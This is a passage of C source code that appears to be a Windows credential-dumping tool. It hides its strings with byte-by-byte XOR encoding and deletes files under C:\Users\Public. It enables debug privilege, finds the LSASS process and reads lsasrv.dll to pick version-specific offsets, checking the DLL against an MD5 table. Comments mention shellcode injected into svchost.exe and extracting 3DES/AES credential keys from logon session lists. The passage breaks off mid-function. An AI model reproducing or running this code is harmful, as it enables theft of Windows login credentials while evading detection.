_fuckingstring0[27] = 52; _fuckingstring0[28] = 52; _fuckingstring0[29] = 55; _fuckingstring0[30] = 48; _fuckingstring0[31] = 53; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde17 = (char*)malloc(100); memcpy(_caoniamde17, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 54; _fuckingstring0[11] = 52; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde18 = (char*)malloc(100); memcpy(_caoniamde18, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 99; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 55; _fuckingstring0[4] = 51; _fuckingstring0[5] = 54; _fuckingstring0[6] = 55; _fuckingstring0[7] = 55; _fuckingstring0[8] = 49; _fuckingstring0[9] = 98; _fuckingstring0[10] = 57; _fuckingstring0[11] = 53; _fuckingstring0[12] = 99; _fuckingstring0[13] = 96; _fuckingstring0[14] = 49; _fuckingstring0[15] = 50; _fuckingstring0[16] = 52; _fuckingstring0[17] = 99; _fuckingstring0[18] = 101; _fuckingstring0[19] = 98; _fuckingstring0[20] = 98; _fuckingstring0[21] = 96; _fuckingstring0[22] = 101; _fuckingstring0[23] = 99; _fuckingstring0[24] = 99; _fuckingstring0[25] = 56; _fuckingstring0[26] = 54; _fuckingstring0[27] = 51; _fuckingstring0[28] = 57; _fuckingstring0[29] = 52; _fuckingstring0[30] = 101; _fuckingstring0[31] = 96; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde19 = (char*)malloc(100); memcpy(_caoniamde19, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 53; _fuckingstring0[7] = 50; _fuckingstring0[8] = 56; _fuckingstring0[9] = 50; _fuckingstring0[10] = 47; _fuckingstring0[11] = 49; _fuckingstring0[12] = 1; FBXorCrypt(_fuckingstring0, 13); char* _caoniamde20 = (char*)malloc(100); memcpy(_caoniamde20, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 99; _fuckingstring0[2] = 96; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 101; _fuckingstring0[6] = 48; _fuckingstring0[7] = 52; _fuckingstring0[8] = 53; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 103; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 55; _fuckingstring0[15] = 57; _fuckingstring0[16] = 100; _fuckingstring0[17] = 53; _fuckingstring0[18] = 53; _fuckingstring0[19] = 50; _fuckingstring0[20] = 96; _fuckingstring0[21] = 52; _fuckingstring0[22] = 51; _fuckingstring0[23] = 100; _fuckingstring0[24] = 49; _fuckingstring0[25] = 49; _fuckingstring0[26] = 57; _fuckingstring0[27] = 101; _fuckingstring0[28] = 99; _fuckingstring0[29] = 48; _fuckingstring0[30] = 101; _fuckingstring0[31] = 54; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde21 = (char*)malloc(100); memcpy(_caoniamde21, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 53; _fuckingstring0[11] = 51; _fuckingstring0[12] = 48; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde22 = (char*)malloc(100); memcpy(_caoniamde22, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 52; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde23 = (char*)malloc(100); memcpy(_caoniamde23, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 50; _fuckingstring0[3] = 47; _fuckingstring0[4] = 56; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 49; _fuckingstring0[8] = 47; _fuckingstring0[9] = 48; _fuckingstring0[10] = 55; _fuckingstring0[11] = 50; _fuckingstring0[12] = 57; _fuckingstring0[13] = 53; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde24 = (char*)malloc(100); memcpy(_caoniamde24, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 47; _fuckingstring0[2] = 48; _fuckingstring0[3] = 47; _fuckingstring0[4] = 54; _fuckingstring0[5] = 55; _fuckingstring0[6] = 49; _fuckingstring0[7] = 48; _fuckingstring0[8] = 47; _fuckingstring0[9] = 51; _fuckingstring0[10] = 55; _fuckingstring0[11] = 52; _fuckingstring0[12] = 55; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde25 = (char*)malloc(100); memcpy(_caoniamde25, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 48; _fuckingstring0[1] = 49; _fuckingstring0[2] = 47; _fuckingstring0[3] = 49; _fuckingstring0[4] = 47; _fuckingstring0[5] = 48; _fuckingstring0[6] = 55; _fuckingstring0[7] = 51; _fuckingstring0[8] = 56; _fuckingstring0[9] = 56; _fuckingstring0[10] = 47; _fuckingstring0[11] = 53; _fuckingstring0[12] = 50; _fuckingstring0[13] = 48; _fuckingstring0[14] = 1; FBXorCrypt(_fuckingstring0, 15); char* _caoniamde26 = (char*)malloc(100); memcpy(_caoniamde26, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 103; _fuckingstring0[1] = 48; _fuckingstring0[2] = 54; _fuckingstring0[3] = 53; _fuckingstring0[4] = 49; _fuckingstring0[5] = 56; _fuckingstring0[6] = 101; _fuckingstring0[7] = 101; _fuckingstring0[8] = 98; _fuckingstring0[9] = 56; _fuckingstring0[10] = 96; _fuckingstring0[11] = 54; _fuckingstring0[12] = 56; _fuckingstring0[13] = 53; _fuckingstring0[14] = 100; _fuckingstring0[15] = 99; _fuckingstring0[16] = 50; _fuckingstring0[17] = 56; _fuckingstring0[18] = 98; _fuckingstring0[19] = 103; _fuckingstring0[20] = 98; _fuckingstring0[21] = 101; _fuckingstring0[22] = 51; _fuckingstring0[23] = 48; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 98; _fuckingstring0[27] = 57; _fuckingstring0[28] = 53; _fuckingstring0[29] = 98; _fuckingstring0[30] = 55; _fuckingstring0[31] = 103; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde27 = (char*)malloc(100); memcpy(_caoniamde27, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 55; _fuckingstring0[1] = 52; _fuckingstring0[2] = 53; _fuckingstring0[3] = 57; _fuckingstring0[4] = 99; _fuckingstring0[5] = 48; _fuckingstring0[6] = 50; _fuckingstring0[7] = 53; _fuckingstring0[8] = 96; _fuckingstring0[9] = 50; _fuckingstring0[10] = 98; _fuckingstring0[11] = 103; _fuckingstring0[12] = 50; _fuckingstring0[13] = 49; _fuckingstring0[14] = 53; _fuckingstring0[15] = 99; _fuckingstring0[16] = 56; _fuckingstring0[17] = 48; _fuckingstring0[18] = 53; _fuckingstring0[19] = 56; _fuckingstring0[20] = 49; _fuckingstring0[21] = 103; _fuckingstring0[22] = 100; _fuckingstring0[23] = 56; _fuckingstring0[24] = 48; _fuckingstring0[25] = 55; _fuckingstring0[26] = 101; _fuckingstring0[27] = 56; _fuckingstring0[28] = 50; _fuckingstring0[29] = 53; _fuckingstring0[30] = 99; _fuckingstring0[31] = 52; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde28 = (char*)malloc(100); memcpy(_caoniamde28, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 56; _fuckingstring0[1] = 52; _fuckingstring0[2] = 48; _fuckingstring0[3] = 96; _fuckingstring0[4] = 51; _fuckingstring0[5] = 50; _fuckingstring0[6] = 57; _fuckingstring0[7] = 100; _fuckingstring0[8] = 56; _fuckingstring0[9] = 55; _fuckingstring0[10] = 53; _fuckingstring0[11] = 99; _fuckingstring0[12] = 100; _fuckingstring0[13] = 50; _fuckingstring0[14] = 54; _fuckingstring0[15] = 103; _fuckingstring0[16] = 54; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 51; _fuckingstring0[21] = 52; _fuckingstring0[22] = 55; _fuckingstring0[23] = 53; _fuckingstring0[24] = 101; _fuckingstring0[25] = 51; _fuckingstring0[26] = 96; _fuckingstring0[27] = 56; _fuckingstring0[28] = 51; _fuckingstring0[29] = 50; _fuckingstring0[30] = 48; _fuckingstring0[31] = 56; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde29 = (char*)malloc(100); memcpy(_caoniamde29, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 101; _fuckingstring0[1] = 101; _fuckingstring0[2] = 57; _fuckingstring0[3] = 98; _fuckingstring0[4] = 96; _fuckingstring0[5] = 98; _fuckingstring0[6] = 98; _fuckingstring0[7] = 100; _fuckingstring0[8] = 49; _fuckingstring0[9] = 51; _fuckingstring0[10] = 49; _fuckingstring0[11] = 56; _fuckingstring0[12] = 100; _fuckingstring0[13] = 52; _fuckingstring0[14] = 103; _fuckingstring0[15] = 54; _fuckingstring0[16] = 98; _fuckingstring0[17] = 53; _fuckingstring0[18] = 98; _fuckingstring0[19] = 50; _fuckingstring0[20] = 48; _fuckingstring0[21] = 54; _fuckingstring0[22] = 51; _fuckingstring0[23] = 49; _fuckingstring0[24] = 100; _fuckingstring0[25] = 51; _fuckingstring0[26] = 53; _fuckingstring0[27] = 48; _fuckingstring0[28] = 54; _fuckingstring0[29] = 57; _fuckingstring0[30] = 103; _fuckingstring0[31] = 49; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde30 = (char*)malloc(100); memcpy(_caoniamde30, _fuckingstring0, 100); MYS_ecureZeroMemory((char*)_fuckingstring0, 100); _fuckingstring0[0] = 100; _fuckingstring0[1] = 99; _fuckingstring0[2] = 56; _fuckingstring0[3] = 96; _fuckingstring0[4] = 96; _fuckingstring0[5] = 99; _fuckingstring0[6] = 100; _fuckingstring0[7] = 54; _fuckingstring0[8] = 51; _fuckingstring0[9] = 99; _fuckingstring0[10] = 96; _fuckingstring0[11] = 96; _fuckingstring0[12] = 57; _fuckingstring0[13] = 57; _fuckingstring0[14] = 51; _fuckingstring0[15] = 48; _fuckingstring0[16] = 99; _fuckingstring0[17] = 48; _fuckingstring0[18] = 49; _fuckingstring0[19] = 96; _fuckingstring0[20] = 56; _fuckingstring0[21] = 56; _fuckingstring0[22] = 98; _fuckingstring0[23] = 103; _fuckingstring0[24] = 53; _fuckingstring0[25] = 98; _fuckingstring0[26] = 49; _fuckingstring0[27] = 57; _fuckingstring0[28] = 55; _fuckingstring0[29] = 56; _fuckingstring0[30] = 54; _fuckingstring0[31] = 50; _fuckingstring0[32] = 1; FBXorCrypt(_fuckingstring0, 33); char* _caoniamde31 = (char*)malloc(100); memcpy(_caoniamde31, _fuckingstring0, 100);
	/*stringarray*/	char* _md5_table[TABLE_LENGTH] = {

	_caoniamde16,

	_caoniamde17,

	_caoniamde18,

	_caoniamde19,

	_caoniamde20,

	_caoniamde21,

	_caoniamde22,

	_caoniamde23,

	_caoniamde24,

	_caoniamde25,

	_caoniamde26,

	_caoniamde27,

	_caoniamde28,

	_caoniamde29,

	_caoniamde30,

	_caoniamde31

	};/*endarray*/

	char _fuckingstring[100];
	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
	if (FBFileExists(_fuckingstring)) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
		DeleteFileA(_fuckingstring);

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
	if (FBFileExists(_fuckingstring)) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
		DeleteFileA(_fuckingstring);

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
	if (FBFileExists(_fuckingstring)) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 104; _fuckingstring[19] = 55; _fuckingstring[20] = 96; _fuckingstring[21] = 110; _fuckingstring[22] = 1; FBXorCrypt(_fuckingstring, 23);
		DeleteFileA(_fuckingstring);

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
	if (FBFileExists(_fuckingstring)) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
		DeleteFileA(_fuckingstring);

	}











	EnableDebugPrivilege();

	DWORD pid = GetLsassPid();

	// lsasrv.dll3

	char* res = (char*)malloc(50);

	ZeroMemory(res, 50);

	getosversion(res);

	//printf("%s\n", res);

		// 

	for (int i = 0; i < 1234; i++) {

		if (res[i] == ' ') {

			// 

			res[i] = '\0'; break;

		}

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 43; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 119; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 104; _fuckingstring[9] = 110; _fuckingstring[10] = 111; _fuckingstring[11] = 59; _fuckingstring[12] = 33; _fuckingstring[13] = 36; _fuckingstring[14] = 114; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
	printf(_fuckingstring, res);





	// credential

	char* asdasdasdasd = (char*)malloc(123);

	ZeroMemory(asdasdasdasd, 123);



	char* readlyversionnumber = (char*)malloc(123);

	ZeroMemory(readlyversionnumber, 123);

	int counterrerer = 0;
#ifdef wotamaxiangshuijiaoa
	printf("asdasdasdasd  111111111111 %s\n", asdasdasdasd);
#endif // wotamaxiangshuijiaoa

	memcpy_s(asdasdasdasd, 123, res, strlen(res));

	for (int i = 0; i < strlen(asdasdasdasd); i++) {

		if (asdasdasdasd[i] == '.') {

			counterrerer++;

			// 

			if (counterrerer == 2) {

				int asdasdcounasdasdasdasd = 0;

				for (int j = i + 1;; j++) {

					asdasdcounasdasdasdasd++;

					if (asdasdasdasd[j] == '.') {

						break;

					}

				}

				memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd - 1);

			}

		}

	}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 116; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 101; _fuckingstring[5] = 33; _fuckingstring[6] = 119; _fuckingstring[7] = 100; _fuckingstring[8] = 115; _fuckingstring[9] = 114; _fuckingstring[10] = 104; _fuckingstring[11] = 110; _fuckingstring[12] = 111; _fuckingstring[13] = 59; _fuckingstring[14] = 33; _fuckingstring[15] = 36; _fuckingstring[16] = 114; _fuckingstring[17] = 11; _fuckingstring[18] = 1; FBXorCrypt(_fuckingstring, 19);
	printf(_fuckingstring, readlyversionnumber);

	int maxpowenum = strlen(readlyversionnumber) - 1;

	int finalnumber = 0;

	int oi = 0;

	for (int i = 0; i < maxpowenum; i++) {

		int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);

		finalnumber += temp;

	}

	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';

	int _build_version = finalnumber;





	int offset____ = 0;

	if (_build_version < 3000) {

		offset____ = 0x70;

	}

	else if (_build_version < 5000) {

		offset____ = 0x70;

	}

	else if (_build_version < 7000) {

		offset____ = 0xd8;

	}

	else if (_build_version < 8000) {

		offset____ = 0xd8;

	}

	else if (_build_version < 9400) {

		offset____ = 0xf8;

	}

	else {

		offset____ = 0x108;

	}

	// lsasrv.dllntheader

	// dlllsasrvdll

	//unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("C:\\windows\\system32\\lsasrv.dll");

	//DWORD error = (unsigned int)GetLastError();

	//if (lsasrvLocal == (unsigned char*)0) {

	//	//printf("[x] load module failed, abort...\n");



	//	char fixed2s3[123] = "[x] load module failed, abort...\n";

	//	fwrite(fixed2s3, 1, strlen(fixed2s3), file);

	//	return 1;

	//}

	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 118; _fuckingstring[4] = 104; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 110; _fuckingstring[8] = 118; _fuckingstring[9] = 114; _fuckingstring[10] = 93; _fuckingstring[11] = 114; _fuckingstring[12] = 120; _fuckingstring[13] = 114; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 108; _fuckingstring[17] = 50; _fuckingstring[18] = 51; _fuckingstring[19] = 93; _fuckingstring[20] = 109; _fuckingstring[21] = 114; _fuckingstring[22] = 96; _fuckingstring[23] = 114; _fuckingstring[24] = 115; _fuckingstring[25] = 119; _fuckingstring[26] = 47; _fuckingstring[27] = 101; _fuckingstring[28] = 109; _fuckingstring[29] = 109; _fuckingstring[30] = 1; FBXorCrypt(_fuckingstring, 31);
	HANDLE asdasdhFile = CreateFileA(_fuckingstring,                // name of the write

		GENERIC_READ,          // open for writing

		0,                      // do not share

		NULL,                   // default security

		OPEN_EXISTING,             // create new file only

		FILE_ATTRIBUTE_NORMAL,  // normal file

		NULL);                  // no attr. template

	if (asdasdhFile == INVALID_HANDLE_VALUE) {

		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 90; _fuckingstring[1] = 121; _fuckingstring[2] = 92; _fuckingstring[3] = 33; _fuckingstring[4] = 115; _fuckingstring[5] = 100; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 33; _fuckingstring[9] = 108; _fuckingstring[10] = 110; _fuckingstring[11] = 101; _fuckingstring[12] = 116; _fuckingstring[13] = 109; _fuckingstring[14] = 100; _fuckingstring[15] = 33; _fuckingstring[16] = 103; _fuckingstring[17] = 96; _fuckingstring[18] = 104; _fuckingstring[19] = 109; _fuckingstring[20] = 100; _fuckingstring[21] = 101; _fuckingstring[22] = 45; _fuckingstring[23] = 33; _fuckingstring[24] = 96; _fuckingstring[25] = 99; _fuckingstring[26] = 110; _fuckingstring[27] = 115; _fuckingstring[28] = 117; _fuckingstring[29] = 47; _fuckingstring[30] = 47; _fuckingstring[31] = 47; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
		printf(_fuckingstring);



		//	char fixed2s3[123] = "[x] read module failed, abort...\n";

			//fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);

		return 1;

	}

	BYTE* ReadBufferasdasd = (BYTE*)malloc(0x1000); DWORD ol = 0;

	ReadFile(asdasdhFile, ReadBufferasdasd, 0x1000, &ol, NULL);//) )

	BYTE* lsasrvLocal = ReadBufferasdasd;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)lsasrvLocal;

	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {

		return 1;

	}

	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)lsasrvLocal + idh->e_lfanew);



	// 

	if (_build_version > 7000 && _build_version < 9400 && nt_headers->FileHeader.TimeDateStamp>0x53480000) {

		offset____ = 0xe8;

	}





	DWORD offset = 0;

#ifdef wotamaxiangshuijiaoa
	printf("asdasdasdasd  22222222222222 %s\n", asdasdasdasd);
#endif // wotamaxiangshuijiaoa
#ifdef wotamaxiangshuijiaoa
	printf("otamaxiangshuiaji  RESSSSS  %s\n", res);
#endif // wotamaxiangshuijiaoa
	for (int i = 0; i < TABLE_LENGTH; i++) {
		if (0 == version_table[i])break;
#ifdef wotamaxiangshuijiaoa
		printf("otamaxiangshuiaji   %s\n", version_table[i]);
#endif // wotamaxiangshuijiaoa
		if (strcmp(res, version_table[i]) == 0) {

			// md5

			// lsasrv.dll

			// lsasrv.dllmd5

			ZeroMemory(_final_md5_hash, 33);

			if (!mainMD5()) {

				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 103; _fuckingstring[5] = 96; _fuckingstring[6] = 104; _fuckingstring[7] = 109; _fuckingstring[8] = 100; _fuckingstring[9] = 101; _fuckingstring[10] = 45; _fuckingstring[11] = 33; _fuckingstring[12] = 96; _fuckingstring[13] = 99; _fuckingstring[14] = 110; _fuckingstring[15] = 115; _fuckingstring[16] = 117; _fuckingstring[17] = 47; _fuckingstring[18] = 47; _fuckingstring[19] = 47; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
				printf(_fuckingstring); exit(-1);

			}

			if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {

				MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 108; _fuckingstring[1] = 101; _fuckingstring[2] = 52; _fuckingstring[3] = 33; _fuckingstring[4] = 108; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 108; _fuckingstring[8] = 96; _fuckingstring[9] = 117; _fuckingstring[10] = 98; _fuckingstring[11] = 105; _fuckingstring[12] = 45; _fuckingstring[13] = 33; _fuckingstring[14] = 98; _fuckingstring[15] = 110; _fuckingstring[16] = 111; _fuckingstring[17] = 117; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 116; _fuckingstring[21] = 100; _fuckingstring[22] = 33; _fuckingstring[23] = 114; _fuckingstring[24] = 100; _fuckingstring[25] = 96; _fuckingstring[26] = 115; _fuckingstring[27] = 98; _fuckingstring[28] = 105; _fuckingstring[29] = 104; _fuckingstring[30] = 111; _fuckingstring[31] = 102; _fuckingstring[32] = 11; _fuckingstring[33] = 1; FBXorCrypt(_fuckingstring, 34);
				printf(_fuckingstring); continue;

			}

			offset = 1;

			// svchost.exeshellcode

			char write_out[123] = { 0 };

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 50; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out, 123, _fuckingstring, i);

			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 49; _fuckingstring[2] = 54; _fuckingstring[3] = 101; _fuckingstring[4] = 1; FBXorCrypt(_fuckingstring, 5);
			sprintf_s(write_out + 3, 120, _fuckingstring, pid);



			// _offset_tableindex

			// logonsessionlist3desaescredentiallogonsessionlist

			//   3bytes  

			// 7lsass pid

			// 80816

			// 8   432



